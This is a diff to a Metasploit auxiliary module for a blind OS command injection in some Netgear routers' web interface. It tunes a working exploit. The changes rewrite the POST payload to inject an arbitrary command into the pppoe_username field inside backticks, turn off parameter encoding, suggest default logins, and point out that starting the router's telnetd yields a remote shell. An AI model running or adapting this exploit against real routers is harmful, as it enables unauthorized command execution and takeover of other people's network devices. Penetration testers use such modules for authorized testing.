@@ -18,14 +18,14 @@ class Metasploit3 < Msf::Auxiliary
 					Some Netgear Routers are vulnerable to OS Command injection.
 				You will need credentials to the webinterface to access the vulnerable part
 				of the application. Default credentials are always a good starting point.
-				admin/admin or admin and blank password could be a first try.
+				admin/admin or admin and password as pass could be a first try.
 				Note: This is a blind os command injection vulnerability. This means that you will
 				not see any output of your command. Try a ping command to your local system for a
 				first test.
 
 				Warning: We overwrite the PPOE Settings. So save them!
 
-				Hint: To get a remote shell you could start the included telnetd.
+				Hint: To get a remote shell you could start the telnetd of the device.
 			},
 			'Author'          => [ 'm-1-k-3' ],
 			'License'         => MSF_LICENSE,
@@ -37,7 +37,6 @@ class Metasploit3 < Msf::Auxiliary
 					[ 'EDB', '24513' ],
 					[ 'OSVDB', '90320' ]
 				],
-			'DefaultTarget'  => 0,
 			'DisclosureDate' => 'Feb 10 2013'))
 
 		register_options(
@@ -81,10 +80,8 @@ class Metasploit3 < Msf::Auxiliary
 			return
 		end
 
-
 		print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])
 
-		#cmd = Rex::Text.uri_encode(datastore['CMD'])
 		cmd = datastore['CMD']
 		#original request:
 		#data_cmd = "login_type=PPPoE%28PPP+over+Ethernet%29&pppoe_username=%26%20#{cmd}%20%26&
@@ -103,11 +100,12 @@ class Metasploit3 < Msf::Auxiliary
 					'uri'	=> uri,
 					'method' => 'POST',
 					'authorization' => basic_auth(user,pass),
-					#'data' => data_cmd
+					#not working without this:
 					'encode_params' => false,
 					'vars_post' => {
-						"login_type" => "PPPoE%28PPP+over+Ethernet%29",
-						"pppoe_username" => "%26%20#{cmd}%20%26",
+						"login_type" => "PPPoE(PPP+over+Ethernet)",
+						#"pppoe_username" => "%26#{cmd}%26",
+						"pppoe_username" => "`#{cmd}`",
 						"pppoe_passwd" => "test123",
 						"pppoe_servicename" => "",
 						"pppoe_dod" => "1",
@@ -124,9 +122,9 @@ class Metasploit3 < Msf::Auxiliary
 						"wan_dns1_pri" => "0.0.0.0",
 						"wan_dns1_sec" => "...",
 						"wan_hwaddr_sel" => "0",
-						"wan_hwaddr_def" => "84%3A1B%3A5E%3A01%3AE7%3A05",
-						"wan_hwaddr2" => "84%3A1B%3A5E%3A01%3AE7%3A05",
-						"wan_hwaddr_pc" => "5C%3A26%3A0A%3A2B%3AF0%3A3F",
+						"wan_hwaddr_def" => "84:1B:5E:E1:E1:E1",
+						"wan_hwaddr2" => "84:1B:5E:E1:E1:E1",
+						"wan_hwaddr_pc" => "5C:26:0A:E1:E1:E1",
 						"wan_nat" => "1",
 						"opendns_parental_ctrl" => "0",
 						"pppoe_flet_sel" => "",
